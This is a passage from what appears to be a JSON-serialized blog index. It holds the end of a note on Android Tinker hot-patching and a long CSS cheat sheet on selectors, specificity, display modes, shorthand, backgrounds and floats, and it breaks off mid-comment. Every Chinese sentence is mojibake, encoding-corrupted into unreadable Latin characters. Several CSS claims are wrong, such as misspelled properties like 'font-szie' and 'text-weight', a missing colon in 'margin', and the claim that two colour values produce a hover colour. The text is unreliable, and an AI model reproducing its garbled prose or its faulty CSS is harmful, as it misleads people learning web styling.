æŠŠä¸‹å‘â€œpatch_signed_7zip.apkâ€è¿™ä¸ªæ–‡ä»¶çš„æ´»å¹²äº†ï¼Œè¿˜ç»™äº†éå¸¸ç›´è§‚çš„æŠ¥è¡¨ï¼Œæ”¶è´¹ä¹Ÿæ˜¯åˆæƒ…åˆç†ã€‚ Androidçƒ­è¡¥ä¸ä¹‹TinkeråŸç†è§£æï¼Œè¿™ç¯‡æ–‡ç« åŸºæœ¬å°†æ•´ä¸ªæµç¨‹éƒ½è®²æ¸…æ¥šäº† çƒ­æ›´æ–°Tinkerç ”ç©¶ï¼ˆä¸‰ï¼‰ï¼šåŠ è½½è¡¥ä¸ å¾®ä¿¡Tinkerçš„ä¸€åˆ‡éƒ½åœ¨è¿™é‡Œï¼ŒåŒ…æ‹¬æºç  Enabling Android Teams: Dex Ed by Jesse WilsonJesse Wilsonè°ˆDexæ–‡ä»¶çš„ç»“æ„ï¼Œå¯æƒœè§†é¢‘æ¸…æ™°åº¦åƒåœ¾","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"çƒ­ä¿®å¤","slug":"çƒ­ä¿®å¤","permalink":"https://haldir65.github.io/tags/çƒ­ä¿®å¤/"}]},{"title":"cssæ“ä½œæ‰‹å†Œ","date":"2017-10-29T22:46:52.000Z","path":"2017/10/29/2017-10-29-pure-css/","text":"cssä½¿ç”¨è®°å½•åŠé€ŸæŸ¥æ‰‹å†Œ 1. åŸºæœ¬æ¦‚å¿µcssåŸºæœ¬è¯­æ³• SELECTOR DECLARATION #page-header { font-szie : 10px;} /*å¯¹äº†ï¼Œæˆ‘æ‰¾äº†åŠå¤©ï¼Œå‘ç°è¿™ä¸ªpage-headerå’Œå¤§æ‹¬å·ä¹‹é—´æœ‰æ²¡æœ‰ç©ºæ ¼æ— æ‰€è°“çš„*/ #page-header{ font-szie : 10px;} /*ä¹Ÿå°±æ˜¯è¿™ä¹ˆå†™ä¹Ÿæ— æ‰€è°“ï¼Œåæ­£æœ€ç»ˆéƒ¨ç½²éƒ½ä¼šåˆ æ‰ç©ºæ ¼*/ ä¾‹å¦‚ .better{ background-color: gray; border: none !important; } ç±»åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½ä½¿ç”¨æ•°å­—ï¼å®ƒæ— æ³•åœ¨ Mozilla æˆ– Firefox ä¸­èµ·ä½œç”¨ã€‚ cssä¸­çš„é•¿åº¦å•ä½æœ‰px,em,ä»¥åŠremï¼ˆ iosï¼š6.1ç³»ç»Ÿä»¥ä¸Šéƒ½æ”¯æŒ. androidï¼š2.1ç³»ç»Ÿä»¥ä¸Šéƒ½æ”¯æŒ.ï¼‰ï¼Œå½“ç„¶è¿˜æœ‰ç™¾åˆ†æ¯”ã€‚ &lt;img src=&quot;https://avatars0.githubusercontent.com/u/1?v=4&quot; width=&quot;70&quot; height=&quot;70&quot;&gt; ä¸å†™å•ä½å°±é»˜è®¤æ˜¯pxäº† 2. å¼•ç”¨æ–¹å¼htmlä¸­å¼•ç”¨cssæœ‰ä¸‰ç§æ–¹å¼: InLine Styling(å†…è”æ ·å¼) åªåœ¨éå¸¸ç‰¹æ®Šçš„æƒ…å†µä¸‹æ‰ä½¿ç”¨ &lt;div&gt; &lt;p id=&#39;content&#39; style=&quot;position: absolute; top:0; left:0; width: 100%&quot;&gt;Inline style are bad&lt;/p&gt; &lt;/div&gt; Embedded style sheets(åµŒå…¥æ ·å¼) åœ¨å½“å‰é¡µé¢ä¸­æ·»åŠ ä¸€ä¸ªæ ·å¼ï¼Œä¸èƒ½å¤ç”¨ &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Embedded style&lt;/title&gt; &lt;style&gt; p{ font-size : 10px; color: red; } .welcome{ color: blue; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; now every p tag in this page will have my style&lt;/p&gt; &lt;p class=&quot;welcome&quot;&gt; this one will have blue text color&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; External style sheets(å¤–éƒ¨æ ·å¼) &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Embedded style&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/syntax.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; now every p tag in this page will have my style&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; æ³¨æ„ä¸Šé¢é‚£ä¸ªrelè¡¨ç¤ºrelation. 3. é€‰æ‹©å™¨åŠä¼˜å…ˆçº§ï¼Œå„ç§Selectorçš„å†™æ³•æ´¾ç”Ÿé€‰æ‹©å™¨ï¼Œä¸¤ç§ä¸åŒçš„æ•ˆæœ 3.1 åŸºäºç±»çš„ï¼Œå¾ˆå¤šæ—¶å€™çœ‹åˆ°ä¸­é—´æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œæ„æ€å°±æ˜¯åœ¨å‰è€…çš„åŸºç¡€ä¸Šï¼Œå†åŠ ä¸Šä¸€äº›é™å®šæ¡ä»¶è¿›è¡ŒæŸ¥æ‰¾&lt;td class=&quot;fancy&quot;&gt; td.fancy { color: #f60; background: #666; } æ‰€æœ‰classæ˜¯fancyçš„tdå°†æ˜¯å¸¦æœ‰ç°è‰²èƒŒæ™¯çš„æ©™è‰²ã€‚ &lt;div class=&#39;fancy&#39;&gt; &lt;td&gt; &lt;/td&gt; &lt;/div&gt; .fancy td { color: #f60; background: #666; } æ‰€æœ‰classæ˜¯fancyçš„å…ƒç´ ï¼Œé‡Œé¢çš„tdéƒ½å°†æ˜¯å¸¦æœ‰ç°è‰²èƒŒæ™¯çš„æ©™è‰²ã€‚ 3.2 åŸºäºidçš„#sidebar p { font-style: italic; text-align: right; margin-top: 0.5em; } æ‰€æœ‰idæ˜¯sidebarçš„æ ‡ç­¾ï¼Œå†…éƒ¨çš„pæ®µè½å…¨éƒ¨åº”ç”¨ä¸Šè¿°æ ·å¼ #sidebar { border: 1px dotted #000; padding: 10px; } div #sidebar { border: 1px dotted #000; padding: 10px; } å› ä¸ºid å±æ€§åªèƒ½åœ¨æ¯ä¸ª HTML æ–‡æ¡£ä¸­å‡ºç°ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¸Šé¢ä¸¤ä¸ªæ˜¯ä¸€æ ·çš„ï¼Œåè€…æŒ‡çš„æ˜¯è¯¥å…ƒç´ æ‰€å±çš„çˆ¶æ ‡ç­¾ã€‚csså±‚å ä¼˜å…ˆçº§: IDsã€class é€‰æ‹©å™¨ä¼˜å…ˆäºelementé€‰æ‹©å™¨æ¯”èµ·classè€Œè¨€idä¼˜å…ˆçº§æ›´é«˜!importantå…·æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§ï¼Œå°½é‡ä¸è¦ä½¿ç”¨ç®€å•è¯´!import &gt; id &gt; class &gt; æ™®é€šçš„tag å…³äºimportantï¼Œèƒ½ä¸ç”¨å°±ä¸è¦ç”¨ã€‚æœ‰äººå¼€ç©ç¬‘è¯´ï¼ŒèŒä¸šç”Ÿæ¶¯ä¸­ä¸è¦ä½¿ç”¨è¶…è¿‡5æ¬¡ã€‚ 3.3 css Conflictå‡å¦‚ä¸€ä¸ªcssæ–‡ä»¶é‡Œé¢å‡ºç°äº† .span{ color : blue } .span{ color: red } ç»“æœæ˜¯åº•éƒ¨çº¢è‰²çš„èµ¢äº†ï¼ŒåŸå› æ˜¯cssæ˜¯Cascadeçš„ï¼Œä»ä¸Šå¾€ä¸‹è¯»æ–‡ä»¶ã€‚å‰ææ˜¯ä¸¤ä¸ªé€‰æ‹©å™¨ä¸€æ¨¡ä¸€æ · body span{ color : blue } .span{ color: red } è¿™ç§æƒ…å†µè¿˜æ˜¯è“è‰²çš„èµ¢ 3.4 cssçš„ç»§æ‰¿åœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œçˆ¶tagå®šä¹‰çš„æ ·å¼æ˜¯ä¼šä¼ é€’ç»™å­tagçš„ï¼Œå¦‚æœå­tagæ²¡æœ‰å¤å†™æ‰ï¼Œé‚£ä¹ˆå°±ä¼špropogateæ•´ä¸ªçˆ¶tagçš„èŒƒå›´ä¾‹å¦‚ body { color : red; } div { color : yellow } p { color: blue } ä¸Šé¢bodyçš„çº¢è‰²å­—ä½“é¢œè‰²ä¼šä¼ é€’ç»™å½“å‰é¡µé¢æ‰€æœ‰tagçš„å­—ä½“ä¸­ï¼Œä½†divå’Œpå„è‡ªå®šä¹‰äº†è‡ªå·±çš„å­—ä½“é¢œè‰²ï¼Œæ‰€ä»¥ç­‰äºå¤å†™äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ—¶å€™æœ‰äº›tagï¼Œä¾‹å¦‚a tagæ˜¯ä¼šè·å¾—æµè§ˆå™¨é»˜è®¤å±æ€§çš„ a { color: blue; text-decoration: underline; } ç±»ä¼¼äºæµè§ˆå™¨é»˜è®¤ç»™ä½ åŠ ä¸Šäº†è¿™ä¹ˆä¸€è¡Œcssã€‚browser çš„default browser style,å¦‚æœä»€ä¹ˆcsséƒ½ä¸åŠ çš„è¯ï¼Œå°±èƒ½çœ‹å‡ºæ¥äº† 3.5 Targeting Multipe Elementsp{ color: red; font-size: 14px; font-weight: bold; font-family: Arial; } span{ color: red; font-size: 14px; font-weight: bold; font-family: Arial; } a{ color: red; font-size: 14px; font-weight: bold; font-family: Arial; } /*è¿˜ä¸å¦‚å†™æˆè¿™æ ·*/ p, span, a{ color: red; font-size: 14px; font-weight: bold; font-family: Arial; } 3.6 Descendant Selectorï¼ˆåä»£é€‰æ‹©å™¨ï¼‰/*è¿™ä¸ªæ„æ€å°±æ˜¯ï¼ŒæŠŠcontentè¿™ä¸ªclassé‡Œé¢çš„æ‰€æœ‰p tagçš„å­—ä½“é¢œè‰²éƒ½æ”¹æˆçº¢è‰²*/ #content p{ color: red; } /*è¿™ä¸ªæ›´è¿›ä¸€æ­¥ï¼Œä¸€å±‚å±‚åµŒå¥—ä¸‹å»ï¼ŒæŒ‡å®šçš„p tagæ‰ä¼šè·å¾—å±æ€§*/ #content #child-content p{ color: red; } è¿™ä¹ˆåµŒå¥—å¤šå°‘å±‚å…¶å®æ²¡å…³ç³»ï¼Œå®è·µä¸­ï¼Œä¸è¦åµŒå¥—å¤ªå¤šå±‚ï¼Œä¸æ–¹ä¾¿ç»´æŠ¤ 3.7 Child Selectorï¼ˆå­é€‰æ‹©å™¨ï¼‰ç¢°åˆ°ä¸‹é¢è¿™ç§htmlï¼Œå¦‚æœåªæƒ³ç»™Direct Childèµ‹å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨child selector &lt;div class=&quot;content&quot;&gt; &lt;p&gt;Direct child&lt;/p&gt; &lt;p&gt;Direct child&lt;/p&gt; &lt;p&gt;Direct child&lt;/p&gt; &lt;div&gt; &lt;p&gt;Indirect child&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; /*è¿™ä¸ªå‘å³çš„ç®­å¤´å°±è¡¨ç¤ºchild selector*/ #content &gt; p{ color: pink; } /*è¿™ä¸ªæ—¶å€™ä¸ä¼šå¯¹Indirect childç”Ÿæ•ˆ*/ è¿™ç§æ–¹å¼èƒ½å¤Ÿåœ¨ä¸å½±å“å…¶ä»–Descendantçš„æƒ…å†µä¸‹è®¾ç½®å±æ€§ 3.8 Adjacent Selectorï¼ˆç›¸é‚»é€‰æ‹©å™¨ï¼‰ç»™ä¸€ä¸ªtagä¹‹åä¸‹ä¸€ä¸ªtagèµ‹å±æ€§ &lt;div id=&#39;all-posts&#39;&gt; &lt;h2&gt;First Article&lt;/h2&gt; &lt;p&gt;Published by Smith&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;h2&gt;Second Article&lt;/h2&gt; &lt;p&gt;Published by John&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;h2&gt;Third Article&lt;/h2&gt; &lt;p&gt;Published by Ted&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;p&gt;something specific about the article content&lt;/p&gt; &lt;/div&gt; ç°åœ¨æƒ³è¦æŠŠæ‰€æœ‰ç´§è·Ÿç€h2æ ‡ç­¾åé¢çš„é‚£ä¸ªp tagè£…é¥°ä¸‹ .all-posts h2 + p{ color: green; } Adjacent Selectorå¿…é¡»æ˜¯follow directly after first element 3.8 Attribute Selectorï¼ˆå±æ€§é€‰æ‹©å™¨ï¼‰é¦–å…ˆæ˜ç¡®ä»€ä¹ˆæ˜¯attributeï¼Œhref,class,id,rel,type,titleè¿™äº›å…¨éƒ½æ˜¯Attributeã€‚ &lt;span&gt;Span without an class Attribute&lt;/span&gt; &lt;span class=&quot;Deck&quot;&gt;&lt;/span&gt; &lt;span class=&quot;Deck&quot;&gt;&lt;/span&gt; &lt;span class=&quot;Deck&quot;&gt;&lt;/span&gt; span[class]{ color: purple; } /*è¿™æ ·å°±èƒ½é€‰ä¸­æ‰€æœ‰ä¸Šé¢å¸¦æœ‰classå±æ€§çš„tag*/ åŒæ ·çš„ï¼Œåªè¦ç”¨ä¸€ä¸ªæ–¹æ‹¬å·æ‹¬èµ·æ¥çš„é€‰æ‹©å™¨ï¼Œå°±èƒ½é€‰ä¸­å¸¦æœ‰ç‰¹å®šå±æ€§çš„æ ‡ç­¾å½“ç„¶è¿˜èƒ½æ›´å…·ä½“ä¸€ç‚¹ï¼Œä¾‹å¦‚ &lt;a href=&#39;#&#39;&gt;&lt;/a&gt; &lt;a href=&#39;http://www.google.com&#39; title=&#39;Google&#39;&gt;&lt;/a&gt; &lt;a href=&#39;http://www.baidu.com&#39; title=&#39;Baidu&#39;&gt;&lt;/a&gt; a[title=&#39;google&#39;]{ color : red; } /*è¿™æ ·åªæœ‰ä¸Šé¢çš„Googleæ ‡ç­¾æ‰å˜æˆçº¢è‰²*/ è¿˜æœ‰æ›´é«˜çº§çš„Pattern Matching &lt;span&gt;Span without an class Attribute&lt;/span&gt; &lt;span class=&quot;deck halls&quot;&gt;&lt;/span&gt; &lt;span class=&quot;deck tails&quot;&gt;&lt;/span&gt; &lt;span class=&quot;deck&quot;&gt;&lt;/span&gt; span[class~=&#39;deck&#39;]{ color: purple; } /*è¿™æ ·ä¸Šé¢ä¸‰ä¸ªéƒ½ä¼šå˜æˆç´«è‰²,æˆ–è€…~ç¬¦å·çš„æ„æ€æ˜¯åªè¦å±æ€§å€¼é‡Œé¢åŒ…å«äº†è¿™ä¸ªdeckå•è¯å°±ç®—*/ &lt;a href=&quot;http://www.baidu.com&quot;&gt;web page&lt;/a&gt; &lt;a href=&quot;something.pdf&quot;&gt;View as pdf&lt;/a&gt; span[href$=&#39;pdf&#39;]{ color: purple; } /*è¿™ä¸ªç¾å…ƒç¬¦å·çš„æ„æ€æ˜¯ä»»ä½•ä»¥pdfç»“å°¾çš„hrefï¼Œå¦‚æœè¦ç®—ä¸Šä»¥xxå¼€å¤´çš„è¯ï¼Œè¿™æ ·*/ span[href^=&#39;http&#39;]{ color: yellow; } 3.9 Pseudo selector&lt;a class=&quot;site&quot; href=&quot;http://www.baidu.com&quot;&gt;ç«™ç‚¹&lt;/a&gt; a:hover{ text-weight: bold; } a:visited{ color: red; } a:active{ color: yellow; } /*activeçš„çŠ¶æ€æ˜¯æŒ‡é¼ æ ‡ç‚¹ä¸Šå»ï¼Œä½†è¿˜æ²¡æœ‰è·³è½¬é¡µé¢é‚£ä¸€ç¬é—´ã€‚å…¶å®ä½ ä¹Ÿå¯ä»¥é¼ æ ‡ç‚¹ä¸Šå»ä¸æ”¾å¼€ï¼Œå°±æ˜¯activeäº†*/ 3.10è¿˜æœ‰first childç­‰ä¾‹å¦‚ &lt;article&gt; &lt;p&gt;First line,or first child&lt;/p&gt; &lt;p&gt;center and other stuffs&lt;/p&gt; &lt;p&gt;center and other stuffs&lt;/p&gt; &lt;p&gt;center and other stuffs&lt;/p&gt; &lt;p&gt;this is the last child&lt;/p&gt; &lt;/article&gt; article p:first-child{ color :blue; } article p:last-child{ color: green; } å…³é”®è¯å°±æ˜¯first-childå’Œlast-childè¿™ä¹ˆç®€å•è¿˜æœ‰first-of-type,last-of-type 4. å¸¸ç”¨å±æ€§é¡ºä¾¿è¯´ä¸€ä¸‹ï¼ŒmrakDowné‡Œé¢æ˜¯èƒ½ç›´æ¥æ’å…¥imgæ ‡ç­¾çš„ background-size : cover;(æ¯”å¦‚è¯´ä½ è¦æ‹¿ä¸€å¼ å¾ˆå¤§çš„å›¾ç‰‡ä½œä¸ºbodyçš„backgroundï¼Œä½†å›¾ç‰‡çš„å¤§å°å·²ç»è¶…å‡ºäº†æµè§ˆå™¨çš„å¤§å°ï¼Œè¿™æ—¶å€™å°±ç”¨coverç¼©æ”¾ä¸€ä¸‹ï¼Œå°±èƒ½å¡«æ»¡äº†) box-sizing å¦‚æœä¸¤ä¸ªelementéƒ½æœ‰marginï¼ŒæŒ¤åœ¨ä¸€èµ·çš„è¯ï¼Œæœ€ç»ˆçš„marginä¸æ˜¯ä¸¤ä¸ªå…ƒç´ ä¹‹é—´çš„marginç›¸åŠ  &lt;div&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt; span{ margin: 0px 10px } å› ä¸ºè¿™ä¿©éƒ½æ˜¯inline-elementsï¼Œæœ€ç»ˆç”Ÿæˆçš„marginä¸æ˜¯10+10=20px ,è€Œæ˜¯10px flex boxå¯ä»¥å®ç°æœ‰æ•ˆçš„å±…ä¸­ã€‚å¤–éƒ¨å®¹å™¨æ·»åŠ display:flexå±æ€§ï¼Œå­å…ƒç´ å¯ä»¥è®¾ç½®è‡ªå·±çš„order(è¶Šå°è¶Šé å‰/å·¦ï¼Œè´Ÿæ•°æœ€å°)ã€‚çˆ¶å®¹å™¨å¯ä»¥è®¾ç½®çš„å±æ€§åŒ…æ‹¬ï¼š flex-direction flex-wrap flex-flow justify-content align-items align-content /*å­å…ƒç´ å¯ä»¥è®¾ç½®çš„å±æ€§åŒ…æ‹¬:*/ order align-self flex-grow flex-shrink flex-basis æ›´å¤šå‚è€ƒMDN 5. blcokï¼Œinlineå’Œinline-block displayå¯èƒ½çš„å€¼åŒ…æ‹¬inline,block,inline-block.å‚è€ƒMDNç½‘ç«™ï¼Œinlineçš„è¯´æ³•æ˜¯ç›¸è¾ƒblockæ¥è¯´çš„ï¼Œå°±æ˜¯é»˜è®¤ä¸ä¼šå¦èµ·ä¸€è¡Œï¼š An inline element does not start on a new line and only takes up as much width as necessary. inlineå’Œblockä»¥åŠinline-blockçš„åŒºåˆ« block-level elements(å—çº§å…ƒç´ )å’Œinline elements(å†…è”å…ƒç´ )ï¼›blockå…ƒç´ å¯ä»¥åŒ…å«blockå…ƒç´ å’Œinlineå…ƒç´ ï¼›ä½†inlineå…ƒç´ åªèƒ½åŒ…å«inlineå…ƒç´ ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ˜¯ä¸ªå¤§æ¦‚çš„è¯´æ³•ï¼Œæ¯ä¸ªç‰¹å®šçš„å…ƒç´ èƒ½åŒ…å«çš„å…ƒç´ ä¹Ÿæ˜¯ç‰¹å®šçš„ï¼Œæ‰€ä»¥å…·ä½“åˆ°ä¸ªåˆ«å…ƒç´ ä¸Šï¼Œè¿™æ¡è§„å¾‹æ˜¯ä¸é€‚ç”¨çš„ã€‚æ¯”å¦‚ P å…ƒç´ ï¼Œåªèƒ½åŒ…å«inlineå…ƒç´ ï¼Œè€Œä¸èƒ½åŒ…å«blockå…ƒç´ ã€‚ display:blockblockå…ƒç´ ä¼šç‹¬å ä¸€è¡Œï¼Œå¤šä¸ªblockå…ƒç´ ä¼šå„è‡ªæ–°èµ·ä¸€è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œblockå…ƒç´ å®½åº¦è‡ªåŠ¨å¡«æ»¡å…¶çˆ¶å…ƒç´ å®½åº¦ã€‚ blockå…ƒç´ å¯ä»¥è®¾ç½®width,heightå±æ€§ã€‚å—çº§å…ƒç´ å³ä½¿è®¾ç½®äº†å®½åº¦,ä»ç„¶æ˜¯ç‹¬å ä¸€è¡Œã€‚ blockå…ƒç´ å¯ä»¥è®¾ç½®marginå’Œpaddingå±æ€§ã€‚ display:inlineinlineå…ƒç´ ä¸ä¼šç‹¬å ä¸€è¡Œï¼Œå¤šä¸ªç›¸é‚»çš„è¡Œå†…å…ƒç´ ä¼šæ’åˆ—åœ¨åŒä¸€è¡Œé‡Œï¼Œç›´åˆ°ä¸€è¡Œæ’åˆ—ä¸ä¸‹ï¼Œæ‰ä¼šæ–°æ¢ä¸€è¡Œï¼Œå…¶å®½åº¦éšå…ƒç´ çš„å†…å®¹è€Œå˜åŒ–ã€‚ inlineå…ƒç´ è®¾ç½®width,heightå±æ€§æ— æ•ˆã€‚ inlineå…ƒç´ çš„marginå’Œpaddingå±æ€§ï¼Œæ°´å¹³æ–¹å‘çš„padding-left, padding-right, margin-left, margin-rightéƒ½äº§ç”Ÿè¾¹è·æ•ˆæœï¼›ä½†ç«–ç›´æ–¹å‘çš„padding-top, padding-bottom, margin-top, margin-bottomä¸ä¼šäº§ç”Ÿè¾¹è·æ•ˆæœã€‚ display:inline-blockç®€å•æ¥è¯´å°±æ˜¯å°†å¯¹è±¡å‘ˆç°ä¸ºinlineå¯¹è±¡ï¼Œä½†æ˜¯å¯¹è±¡çš„å†…å®¹ä½œä¸ºblockå¯¹è±¡å‘ˆç°ã€‚ä¹‹åçš„å†…è”å¯¹è±¡ä¼šè¢«æ’åˆ—åœ¨åŒä¸€è¡Œå†…ã€‚æ¯”å¦‚æˆ‘ä»¬å¯ä»¥ç»™ä¸€ä¸ªlinkï¼ˆaå…ƒç´ ï¼‰inline-blockå±æ€§å€¼ï¼Œä½¿å…¶æ—¢å…·æœ‰blockçš„å®½åº¦é«˜åº¦ç‰¹æ€§åˆå…·æœ‰inlineçš„åŒè¡Œç‰¹æ€§ã€‚ 5.cssçš„ç®€å†™å¤šçš„ä¸æ•¢æƒ³,short-handä¸‹é¢è¿™ä¸‰ä¸ªæ˜¯ä¸€ä¸ªæ„æ€ï¼Œä¹Ÿå°±æ˜¯è¯´cssæ˜¯æŒ‰ç…§é¡ºæ—¶é’ˆä¸Šï¼Œå³ï¼Œä¸‹ï¼Œå·¦çš„é¡ºåºæ¥çš„ .content{ margin 10px 20px 10px 20px; } .content { margin 10px 20px; } .content{ margin-top: 10px; margin-right: 20px; margin-bottom: 10px; margin-left: 20px; } h2{ color: #ffffff #0000000 ; /* è¿™ä¸ªæ„æ€æ˜¯å¹³æ—¶æ˜¯ç™½è‰²ï¼Œé¼ æ ‡ç§»ä¸Šå»å°±å˜æˆé»‘è‰² */ } é™¤äº†marginä»¥å¤–,paddingä¹Ÿæ˜¯ã€‚è‡³äºé‚£ç§å€’è§’ï¼Œä¾‹å¦‚border-radius,åˆ™æ˜¯å·¦ä¸Šè§’,å³ä¸Šè§’ï¼Œå³ä¸‹è§’ï¼Œå·¦ä¸‹è§’è¿™æ ·çš„é¡ºåº .round_corner{ border-radius: 10px; } .round_corner{ border-radius: 10px 20px; /* å·¦ä¸Šè§’ï¼Œå³ä¸‹è§’10px,å³ä¸Šè§’å’Œå·¦ä¸‹è§’20px*/ } .round_corner{ border-radius: 10px 20px 30px 40px; } .circle{ width: 100px; height:100px; border-radius: 50px; /* ç³Šä¸€ä¸ªåœ†*/ } .back{ background-color: #606060; background-image: url(#) ; background-repeat: no-repeat; /*repeatçš„æ„æ€æ˜¯å›¾ç‰‡å¡«ä¸æ»¡å®¹å™¨çš„è¯ï¼Œä»å·¦åˆ°å³ï¼Œä»ä¸Šåˆ°ä¸‹é‡å¤ä¸€é */ background-position: center; /*å°†å›¾ç‰‡å±…ä¸­æ‘†æ”¾åœ¨å®¹å™¨ä¸­ï¼Œè¿˜æœ‰bottom-centerï¼Œbottom-rightç­‰*/ background-position: 10px 20px; /*è·ç¦»å·¦è¾¹10px,é¡¶éƒ¨20px*/ background-size: 200px; /*å›¾ç‰‡çš„å®½é«˜ï¼Œè‡ªåŠ¨ç¼©æ”¾*/ } .simplyfy{ background: url (#) no-repeat top center; background-color: #606060; } /*è¿™æ˜¯ä¸€ç§ç®€å†™çš„æ–¹å¼,æ³¨æ„backgroundColorå’Œbackgroundæœ€å¥½åˆ†å¼€å†™*/ .multiple_background{ background-image: url(&#39;url1&#39;),url(&#39;url2&#39;); /*å¤šå±‚èƒŒæ™¯ï¼Œurl1å åœ¨æœ€é¡¶å±‚ï¼Œå¯ä»¥æƒ³è±¡æ˜¯zè½´æœ€ä¸Šæ–¹ï¼Œurl2åœ¨ä¸‹é¢ï¼Œä¸­é—´ä¸€å®šè¦æœ‰ä¸€ä¸ªé€—å·ã€‚*/ background-repeat: no-repeat,no-repeat; /*ä¸­é—´æœ‰ä¸€ä¸ªé€—å·ï¼Œno-repeatå±æ€§åˆ†åˆ«åº”ç”¨åœ¨url1å’Œurl2ä¸Šã€‚ç”±äºä¸Šé¢è¿™ä¿©ä¸€æ ·çš„ï¼Œæ‰€ä»¥åªå†™ä¸€ä¸ªä¹Ÿè¡Œ*/ background-position: center,top left; background-size: 300px,100%; /*éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåˆ†åˆ«ä¸€ä¸€å¯¹åº”*/ } /*ç”»ä¸‰ä¸ªåœ†*/ #circle{ width: 400px; height: 400px; position: absolute; background: rgb(200, 200, 100); border-radius: 200px; top: 50px; left: 50px; opacity: 0; /* è¿™ä¸ªæ˜¯é€æ˜åº¦ï¼Œ0è¡¨ç¤ºå®Œå…¨é€æ˜*/ text-align: center; background: rgba(200, 200, 100, 0.5); /*æ³¨æ„opacityä¼šå½±å“divé‡Œé¢textçš„é€æ˜ åº¦ï¼Œrgbaä¸ä¼šå½±å“*/ } #circle-2{ width: 400px; height: 400px; position: absolute; background: rgb(200, 100, 200); border-radius: 200px; top: 250px; left: 150px; } #circle-3{ width: 400px; height: 400px; position: absolute; border-radius: 200px; top: 50px; left: 250px; background: #aadddd; background: linear-gradient(top,#aadddd,0%,#77aaaa,100%); /*Gradientåœ¨æœ‰äº›æµè§ˆå™¨ä¸Šä¸æ”¯æŒï¼Œæ¯•ç«Ÿæ˜¯æ¯”è¾ƒæ–°çš„å±æ€§ï¼Œè¿™æ—¶å€™å°±ä¼šfallbackåˆ°backgroundä¸Šï¼Œæ‰€ä»¥æ”¯æŒçš„è¯å°±æœ‰æ¸å˜è‰²ï¼Œä¸æ”¯æŒçš„è¯å°±æ¢å¤åˆ°è®¾å®šçš„é¢œè‰²ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸€ä¸ªå±æ€§å†™ä¸¤éçš„åŸå› */ /*ä½†æ˜¯ä¸Šé¢ä¸¤è¡Œåœ¨chromeé‡Œé¢ä¸ä¼šå‡ºç°æ¸å˜è‰²,éœ€è¦vender-prefix*/ background: -moz-linear-gradient(top,#aadddd,0%,#77aaaa,100%); background: -webkit-linear-gradient(top,#aadddd,0%,#77aaaa,100%); background: linear-gradient(top,#aadddd,0%,#77aaaa,100%); /*è¿™ä¸ªtopçš„æ„æ€æ˜¯ä»ä¸Šå¼€å§‹æ¸å˜ï¼Œå†™bottomä¹Ÿè¡Œï¼Œä»ä¸‹å¾€ä¸Š*/ } .shadow_box{ box-shadow: 2px 2px 4px 2px rgba(40,40,40,0.6); /*åˆ†åˆ«æ˜¯é˜´å½±è·ç¦»å…ƒç´ çš„å³ä¾§çš„è·ç¦»å’Œè·ç¦»åº•éƒ¨çš„è·ç¦»ä»¥åŠé˜´å½±éœ€è¦å¤šæ·±ï¼Œè¶Šå¤§è¶Šæ·±ï¼Œæœ€åæ˜¯é˜´å½±æ‹“å±•çš„è·ç¦».å¤–åŠ é˜´å½±çš„é¢œè‰²*/ } cssmaticè¿™ä¸ªç½‘ç«™å¯ä»¥ä½¿ç”¨æ‹–æ‹½çš„æ–¹å¼ç”Ÿæˆshadowçš„cssæ–‡ä»¶ ======================================sass============================= 5. css positioningé¦–å…ˆæ˜¯float,Float å¯ç”¨äºå®ç°æ–‡å­—ç¯ç»•å›¾ç‰‡(åŠ åœ¨å›¾ç‰‡çš„å±æ€§ä¸Š)the float element no longer take any height in document flow &lt;div class=&quot;wrapper&quot;&gt; &lt;img src=&quot;picture.jpg&quot; width=&quot;300px&quot;&gt;&lt;/img&gt; &lt;p&gt;è¿™æ®µæ–‡å­—é»˜è®¤ä¼šå¦èµ·ä¸€è¡Œåœ¨å›¾ç‰‡ä¸‹é¢&lt;/p&gt; &lt;/div&gt; .wrapper{ background: #ffffff; max-width: 960px; margin: 0 auto; padding: 20px; } /*margin auto è®©è¿™ä¸ªwrapperåœ¨å…¶çˆ¶å®¹å™¨ä¸­æ¨ªå‘å±…ä¸­æ˜¾ç¤º*/ img{ float: left; margin: 10px; } /*float: 